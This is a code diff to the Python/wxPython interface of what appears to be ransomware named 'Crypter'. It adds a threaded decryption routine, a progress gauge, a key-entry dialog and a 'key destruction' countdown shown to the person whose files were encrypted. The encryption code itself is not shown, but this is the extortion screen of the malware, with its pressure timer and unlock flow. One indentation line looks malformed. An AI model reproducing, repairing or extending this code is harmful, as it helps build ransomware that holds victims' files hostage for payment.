@@ -9,32 +9,131 @@ import wx
 import os
 import time
 
+# Threading imports
+from threading import Thread, Event
+from wx.lib.pubsub import setuparg1
+from wx.lib.pubsub import pub as Publisher
+
 # Import Classes
 import Base
 from GuiAbsBase import MainFrame
 from GuiAbsBase import ViewEncryptedFilesDialog
 from GuiAbsBase import EnterDecryptionKeyDialog
 
-# Implementing MainFrame
+
+############################
+## DECRYPTIONTHREAD CLASS ##
+############################
+class DecryptionThread(Thread):
+	'''
+	@summary: Provides a thread for file decryption
+	'''
+	
+	def __init__(self, encrypted_files_list, decrypted_files_list, parent, 
+				decrypter, decryption_key):
+		'''
+		@summary: Constructor: Starts the thread
+		@param encrypted_files_list: The list of encrypted files
+		@param decrypted_files_list: The list of files that were decrypted, but have now been decrypted
+		@param parent: Handle to the GUI parent object
+		@param decrypter: Handle to the decrypter (Main object)
+		@param decryption_key: AES 256 bit decryption key to be used for file decryption
+		'''
+		self.parent = parent
+		self.encrypted_files_list = encrypted_files_list
+		self.decrypted_files_list = decrypted_files_list
+		self.decrypter = decrypter
+		self.decryption_key = decryption_key
+		self.in_progress = False
+		self.decryption_complete = False
+		self._stop_event = Event()
+		
+		# Start thread
+		Thread.__init__(self)
+		self.start()
+		
+	
+	def run(self):
+		'''
+		@summary: Performs decryption of the encrypted files
+		'''
+		self.in_progress = True
+		
+		# Iterate encrypted files
+		for i in range(len(self.encrypted_files_list)):
+
+			# Check for thread termination signal and break if set
+			if self._stop_event.is_set():
+				break
+			else:
+			  # Decrypt file and add to list of decrypted files. Update progress
+			  self.decrypter.decrypt_file(self.encrypted_files_list[i], self.decryption_key)
+			  self.decrypted_files_list.append(self.encrypted_files_list[i])
+			  Publisher.sendMessage("update", "")
+			
+		
+		# Encryption stopped or finished
+		self.in_progress = False
+
+		# Check if decryption was completed
+		if len(self.decrypted_files_list) == len(self.encrypted_files_list):
+			self.decryption_complete = True
+			
+		# Run a final progress update
+		Publisher.sendMessage("update", "")
+
+		# Remove decrypted files from the list of encrypted files
+		# Update the GUIs encrypted and decrypted file lists
+		for file in self.decrypted_files_list:
+			if file in self.encrypted_files_list:
+			  self.encrypted_files_list.remove(file)
+
+		# Make sure GUI file lists are up-to-date
+		self.parent.decrypted_files_list = []
+		self.parent.encrypted_files_list = self.encrypted_files_list
+		
+		# If forcefully stopped, close the dialog
+		if self._stop_event.is_set():
+		  self.parent.decryption_dialog.Destroy()
+			
+
+	def stop(self):
+		'''
+		@summary: To be called to set the stop event and terminate the thread after the next cycle
+		'''
+		
+		# If complete or not in progress, and event is already set, close forcefully
+		if  self.decryption_complete or not self.in_progress:
+		  self.parent.decryption_dialog.Destroy()
+		# Otherwise, only set signal
+		else:
+		  self._stop_event.set()
+		
+
+###############
+## GUI CLASS ##
+###############
 class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.Base):
 	'''
 	@summary: Main GUI class. Inherits from GuiAbsBase and defines Crypter specific functions,
 	labels, text, buttons, images etc. Also inherits from main Base for schema
 	'''
 	
-	def __init__( self, image_path, start_time, encrypted_file_list, decrypter ):
+	def __init__( self, image_path, start_time, decrypter ):
 		'''
 		@summary: Constructor
 		@param image_path: The path to look at to find resources, such as images.
 		@param start_time: EPOCH time that the encryption finished.
-		@param encrypted_file_list: List of encrypted files
 		@param decrypter: Handle back to Main. For calling decryption method
 		'''
 		# Handle Params
 		self.image_path = image_path
 		self.start_time = start_time
-		self.encrypted_file_list = encrypted_file_list
 		self.decrypter = decrypter
+		self.decryption_thread = None
+		self.decryption_dialog = None
+		self.encrypted_files_list = self.decrypter.get_encrypted_files_list()
+		self.decrypted_files_list = []
 		
 		# Define other vars
 		self.set_message_to_null = True
@@ -47,6 +146,60 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		
 		# Update events
 		self.set_events()
+		
+		# Create pubsub listener to update the decryption progress
+		Publisher.subscribe(self.update_decryption_progress, "update")
+		
+	
+	def update_decryption_progress(self, msg):
+		'''
+		@summary: Updates the decryption progress in the GUI
+		'''
+
+		# Calculate percentage completion
+		if len(self.encrypted_files_list) == 0:
+		  percentage_completion = 100
+		else:
+		  percentage_completion = float(len(self.decrypted_files_list)) * 100.0 / float(len(self.encrypted_files_list))
+		
+		# Update number of encrypted files remaining
+		if not self.decryption_thread.decryption_complete:
+		  encrypted_files_remaining = len(self.encrypted_files_list) - len(self.decrypted_files_list)
+	 	else:
+	 	  encrypted_files_remaining = 0
+
+		# Set encrypted files number in GUI
+		self.decryption_dialog.EncryptedFilesNumberLabel.SetLabelText(
+		  "Encrypted Files: %s" % encrypted_files_remaining)
+		
+		# Update Decryption percentage completion
+		if percentage_completion != 100:
+		  self.decryption_dialog.StatusText.SetLabelText(
+			  self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING + " (%d%%)" % percentage_completion
+			  )
+		else:
+		  self.decryption_dialog.StatusText.SetLabelText(
+			  self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED + " (%d%%)" % percentage_completion
+			  )
+		
+		# Update decryption gauge
+		if self.encrypted_files_list:
+			self.decryption_dialog.DecryptionGauge.SetValue(percentage_completion)
+		else:
+			self.decryption_dialog.DecryptionGauge.SetValue(100)
+			
+		# If the decryption has successfully finished, update the GUI
+		if not self.decryption_thread.in_progress and self.decryption_thread.decryption_complete:
+		  # Cleanup decrypter and change dialog message
+		  self.decrypter.cleanup()
+		  # Update main window
+		  self.key_destruction_timer.Stop()
+		  self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED)
+		  self.FlashingMessageText.SetForegroundColour( wx.Colour(2, 217, 5) )
+		  self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED)
+		  self.KeyDestructionTime.SetForegroundColour( wx.Colour(2, 217, 5) )
+		  # Disable decryption dialog button
+		  self.EnterDecryptionKeyButton.Disable()
 		
 
 	def set_events(self):
@@ -65,22 +218,51 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		self.Bind(wx.EVT_BUTTON, self.show_decryption_dialog, self.EnterDecryptionKeyButton)
 		
 	
+	def stop_decryption(self, event):
+		'''
+		@summary: Called when the decryption dialog is closed. Sends a stop event
+		signal to the decryption thread if it exists
+		'''
+		
+		# Send stop event to the decryption thread if it exists
+		if self.decryption_thread and self.decryption_thread.in_progress:
+		  self.decryption_thread.stop()
+		# Otherwise just kill the dialog
+		else:
+		  self.decryption_dialog.Destroy()
+		  
+	
 	def show_decryption_dialog(self, event):
 		'''
 		@summary: Creates a dialog object to show the decryption dialog
 		'''
 		
+		# If dialog open. Don't open another
+		if self.decryption_dialog:
+			return
+		
 		# Create dialog object
 		self.decryption_dialog = EnterDecryptionKeyDialog(self)
+		# Set gauge size
+		self.decryption_dialog.DecryptionGauge.SetRange(100)
+		# Set encrypted file number
+		self.decryption_dialog.EncryptedFilesNumberLabel.SetLabelText(
+			self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FILE_COUNT + str(
+				len(self.encrypted_files_list) - len(self.decrypted_files_list)
+				)
+		 	)
 		
 		# Bind OK button to decryption process
-		self.decryption_dialog.Bind(wx.EVT_BUTTON, self.decrypt, self.decryption_dialog.OkCancelSizerOK)
+		self.decryption_dialog.Bind(wx.EVT_BUTTON, self.start_decryption_thread, self.decryption_dialog.OkCancelSizerOK)
+		# Bind close and cancel event to thread killer
+		self.decryption_dialog.Bind(wx.EVT_BUTTON, self.stop_decryption, self.decryption_dialog.OkCancelSizerCancel)
+		self.decryption_dialog.Bind(wx.EVT_CLOSE, self.stop_decryption)
 		self.decryption_dialog.Show()
 		
 		
-	def decrypt(self, event):
+	def start_decryption_thread(self, event):
 		'''
-		@summary: Handles the decryption process from a GUI level
+		@summary: Called once the "OK" button is hit. Starts the decryption process (inits the thread)
 		'''
 		
 		# Check for valid key
@@ -90,54 +272,30 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 			return
 		else:
 			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING)
-		
-		wx.Yield()
-		# Start the decryption
+
 		# Disable dialog buttons
 		self.decryption_dialog.OkCancelSizerOK.Disable()
 		self.decryption_dialog.OkCancelSizerCancel.Disable()
 		
-		# Get list of encrypted files and update gauge
-		encrypted_files_list = self.decrypter.get_encrypted_file_list()
-		self.decryption_dialog.DecryptionGauge.SetRange(len(encrypted_files_list))
-
-		# Iterate file list and decrypt
-		decrypted_file_list = []
-		for encrypted_file in encrypted_files_list:
-			self.decrypter.decrypt_file(encrypted_file, key_contents)
-			decrypted_file_list.append(encrypted_file)
-			self.decryption_dialog.DecryptionGauge.SetValue(len(decrypted_file_list))
-			wx.Yield()
-			
-		# Decryption complete
-		self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED)
-		self.decrypter.cleanup()
-		
-		# Re-enable button
-		self.decryption_dialog.OkCancelSizerCancel.Enable()
-		
-		# Update main window
-		self.key_destruction_timer.Stop()
-		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED)
-		self.FlashingMessageText.SetForegroundColour( wx.Colour(2, 217, 5) )
-		self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED)
-		self.KeyDestructionTime.SetForegroundColour( wx.Colour(2, 217, 5) )
-		
-		# Disable decrypt button
-		self.EnterDecryptionKeyButton.Disable()
-		
+		# Start the decryption thread
+		self.decryption_thread = DecryptionThread(self.encrypted_files_list, self.decrypted_files_list,
+												self, self.decrypter, key_contents)
+	
 
 	def show_encrypted_files(self, event):
 		'''
 		@summary: Creates a dialog object showing a list of the files that were encrypted
 		'''
 		
-		# Create dialog object
+		# Create dialog object and file list string
 		self.encrypted_files_dialog = ViewEncryptedFilesDialog(self)
+		encrypted_files_list = ""
+		for file in self.encrypted_files_list:
+			encrypted_files_list += "%s" % file
 
 		# If the list of encrypted files exists, load contents
-		if os.path.isfile(self.encrypted_file_list):
-			self.encrypted_files_dialog.EncryptedFilesTextCtrl.LoadFile(self.encrypted_file_list)
+		if encrypted_files_list:
+			self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetValue(encrypted_files_list)
 		# Otherwise set to none found
 		else:
 			self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
@@ -165,7 +323,6 @@ class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.B
 		time_remaining = self.get_time_remaining()
 		
 		# If the key has been destroyed, update the menu text
-		# TODO Test
 		if not time_remaining:
 			self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_KEY_DESTROYED)
 			# Set timer colour to black
